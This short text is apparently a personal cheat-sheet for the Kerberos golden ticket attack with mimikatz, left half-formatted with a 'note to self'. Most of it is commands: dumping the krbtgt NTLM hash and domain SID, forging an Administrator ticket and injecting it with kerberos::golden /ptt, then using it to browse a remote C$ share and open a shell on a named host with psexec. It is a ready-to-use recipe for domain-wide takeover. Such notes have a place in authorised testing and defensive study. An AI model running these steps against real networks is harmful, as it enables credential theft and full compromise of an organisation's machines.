Using the golden ticket. access to any other machine is granted. Commands can be run from one machine to access all the others, or even make a shell with PsExec.
How to do it
Required: krbtgt NTLM hash, domain SID.
mimikatz
privilege::debug
lsadump::lsa /inject /name:krbtgt
The output will provide the SID in the following format:
Domain : [DOMAIN NAME] / [SID NUMBER]
Once this information is obtained, run the following command on mimikatz:
kerberos::golden /User:Administrator /domain:[DOMAIN NAME] /sid:[FULL SID] /krbtgt:[krbtgt NTLM HASH] /id:500 /ptt
From there, a cmd can be launched with the following command:
misc::cmd
Finally, on cmd, the session can access any machine. e.g:
dir \\THEPUNISHER\c$
psexec.exe \\THEPUNISHER cmd.exe # Install psexec, then run this to get a shell on the machine
# Note to self - need to format
